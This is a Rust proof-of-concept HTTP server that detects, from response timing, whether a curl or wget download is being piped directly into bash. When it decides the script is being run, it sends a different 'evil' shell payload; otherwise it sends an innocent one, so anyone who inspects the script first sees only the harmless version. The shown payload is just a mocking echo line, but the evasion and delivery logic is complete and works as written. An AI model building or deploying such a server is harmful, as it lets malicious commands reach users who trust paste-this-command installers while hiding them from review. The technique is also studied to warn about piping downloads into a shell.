#![feature(duration_float)]

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::time::Duration;

// from https://gist.githubusercontent.com/mjohnsullivan/e5182707caf0a9dbdf2d/raw/c1a2f4c04bd4b4fd0cc9489612da7e11a8f16e7a/http_server.rs

use std::cmp::Ordering;
use std::thread;
use std::time::Instant;

/*
good:
Variance = 0.000000024579828288862217, Maximum Jump = 0.00013909699999999997
bad:
Variance = 0.00000015643485087709332,  Maximum Jump = 0.0002735080000000001
*/

const MIN_VARIANCE: f64 = 0.1;
const MIN_JUMP: f64 = 1.0; // with python 0.1

const SOCKET_TIMEOUT: Option<Duration> = Some(Duration::from_secs(10));

const HTTP_SUCCESS_HEADERS: &[u8] = b"HTTP/1.1 200 OK\r
Server: nginx\r
Content-Type: text/plain; charset=us-ascii\r
Transfer-Encoding: chunked\r
Connection: keep-alive\r\n\r\n";

const BUFFER_SIZE: u32 = 87380;

const PADDING: &[u8; BUFFER_SIZE as usize] = &[0u8; BUFFER_SIZE as usize];

// Maximum number of blocks of padding - this
// shouldn't need to be adjusted but may need to be increased
// if its not working.
const MAX_PADDING: u8 = 32;

fn handle_read(mut stream: &TcpStream) -> Option<bool> {
    let mut buf = [0u8; 1024];
    match stream.read(&mut buf) {
        Ok(_) => {
            let req_str = String::from_utf8_lossy(&buf).to_lowercase();
            println!("{}", req_str);
            return Some(
                req_str.contains("user-agent: curl") || req_str.contains("user-agent: wget"),
            );
        }
        Err(e) => println!("Unable to read stream: {}", e),
    }
    None
}

fn send_chunk(mut stream: &TcpStream, response: &[u8]) -> std::io::Result<usize> {
    stream.write(format!("{:x}\r\n", response.len()).as_bytes())?;
    stream.write(response)?;
    stream.write(b"\r\n")
}

fn handle_client(stream: TcpStream) -> std::io::Result<usize> {
    stream.set_read_timeout(SOCKET_TIMEOUT)?;
    let curl_or_wget = handle_read(&stream);
    if curl_or_wget.is_none() {
        println!("HTTP request malformed");
        return Ok(0);
    }

    stream.set_write_timeout(SOCKET_TIMEOUT)?;
    stream.set_nodelay(true)?;

    let wait = b"sleep 3\n";
    let good = b"echo \"Hello there :)\"\n";
    let evil = b"echo \"r00t1ng y0ur b0x0rs >:)\"\n";
    let end = b"";

    let mut stream = stream;

    stream.write(HTTP_SUCCESS_HEADERS)?;

    send_chunk(&stream, wait)?;

    if !curl_or_wget.unwrap() {
        println!("curl/wget not detected, returning good");
        send_chunk(&stream, good)?;
        return send_chunk(&stream, end);
    }

    let mut timing: [f64; MAX_PADDING as usize] = [0.0; MAX_PADDING as usize];
    let now = Instant::now();

    for x in 0..MAX_PADDING {
        send_chunk(&stream, PADDING)?;
        timing[x as usize] = now.elapsed().as_float_secs();
    }

    println!("timing {:?}", timing);

    let mut max_index = 0;
    let mut max = -1.0;
    for x in 0..(MAX_PADDING - 1) {
        timing[x as usize] = timing[(x + 1) as usize] - timing[x as usize];
        // todo: remove this unwrap, maybe do away with floats?
        if max.partial_cmp(&timing[x as usize]).unwrap() == Ordering::Less {
            max_index = x as usize;
            max = timing[max_index];
        }
    }
    // now set max_index to 0 so it doesn't calculate into mean() below
    timing[max_index] = 0.0;

    println!("timing calc {:?}", timing);
    println!("max {:?}", max);
    println!("max_index {:?}", max_index);

    let variance = std_deviation(&timing, &max_index).powi(2);

    println!("Variance = {}, Maximum Jump = {}", variance, max);

    if variance > MIN_VARIANCE && max > MIN_JUMP {
        println!("Execution through bash detected - sending bad payload :D");
        send_chunk(&stream, evil)?;
    } else {
        println!("Sending good payload :(");
        send_chunk(&stream, good)?;
    }

    send_chunk(&stream, end)
}

fn mean(data: &[f64], count: f64) -> f64 {
    let sum = data.iter().sum::<f64>();
    sum / count
}

fn std_deviation(data: &[f64], exclude_index: &usize) -> f64 {
    let count = (data.len() - 1) as f64;
    let data_mean = mean(data, count);
    let variance = data
        .iter()
        .enumerate()
        .filter(|(index, _)| index != exclude_index)
        .map(|(_, value)| (data_mean - value).powi(2))
        .sum::<f64>()
        / count;

    variance.sqrt()
}

fn main() {
    {
        let data = [
            0.00011777877807617188,
            0.0003631114959716797,
            0.0,
            8.797645568847656e-05,
        ];

        let data_mean = mean(&data, (data.len() - 1) as f64);
        println!("Mean is {:?}", data_mean); // 0.00018962224324544272

        let data_std_deviation = std_deviation(&data, &2);
        println!("Standard deviation is {:?}", data_std_deviation); // 0.00012327728964562268
    }

    let listener = TcpListener::bind("0.0.0.0:5555").unwrap();
    println!("Listening for connections on port {}", 5555);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| handle_client(stream).expect("error handling connection"));
            }
            Err(e) => {
                println!("Unable to connect: {}", e);
            }
        }
    }
}
